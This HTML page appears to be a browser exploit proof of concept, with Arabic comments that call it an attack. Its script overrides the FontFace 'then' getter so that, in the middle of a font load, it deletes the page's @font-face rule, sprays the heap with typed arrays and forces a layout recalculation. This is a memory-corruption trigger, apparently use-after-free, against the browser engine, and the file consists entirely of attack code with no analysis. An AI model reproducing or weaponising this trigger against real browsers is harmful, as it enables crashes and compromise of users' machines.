<!DOCTYPE html><html>
<head>
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body>
<script>
window.onload = () => {
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let fired = false;
    let spray = []; // مصفوفة الحشو

    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                // الهجوم المدمج
                document.getElementById('s').sheet.deleteRule(0);
                
                // عملية الحشو (Spray) في لحظة حذف القاعدة
                for (let i = 0; i < 5; i++) {
                    spray.push(new Uint32Array(32)); 
                }
                
                document.body.offsetTop; // إجبار المحرك على إعادة الحساب
            }
            return undefined;
        }
    });

    document.fonts.load('1em x', 'AB');
};
</script>
</body>
</html>
